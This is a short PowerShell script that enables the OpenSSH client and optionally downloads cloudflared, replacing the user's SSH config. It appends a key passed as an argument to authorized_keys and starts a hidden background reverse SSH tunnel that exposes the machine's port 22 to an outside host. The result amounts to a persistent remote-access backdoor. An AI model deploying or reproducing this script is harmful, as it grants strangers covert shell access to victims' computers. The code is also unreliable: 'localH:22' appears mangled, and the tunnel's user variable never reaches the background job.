$H = $args[0]
$P = $args[1]
$UseCF = $args[2]
$K = $args[3]
$SP = $MyInvocation.MyCommand.Path

$U = "sshtunneluser"


# Enable OpenSSH client
Add-WindowsCapability -Online -Name OpenSSH.Client* | Out-Null

# If the user is using Cloudflare tunneling
if ($UseCF -eq "true") {
    # Download and setup cloudflared
    $cloudflaredUrl = "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
    Invoke-WebRequest -Uri $cloudflaredUrl -OutFile "$env:TEMP\cloudflared.exe"

    # Create SSH config
    $sshConfig = @"
    Host $H
    ProxyCommand $env:TEMP\cloudflared.exe access ssh --hostname %h
"@
    New-Item -Path "$env:USERPROFILE\.ssh" -ItemType Directory -Force
    Set-Content -Path "$env:USERPROFILE\.ssh\config" -Value $sshConfig
}

# Setup authorized key
New-Item -Path "$env:USERPROFILE\.ssh" -ItemType Directory -Force
Add-Content -Path "$env:USERPROFILE\.ssh\authorized_keys" -Value $K

# Start reverse SSH tunnel in background
Start-Job -ScriptBlock {
    param($H, $P)
    ssh -R ${P}:localH:22 $U@$H -N
} -ArgumentList $H, $P


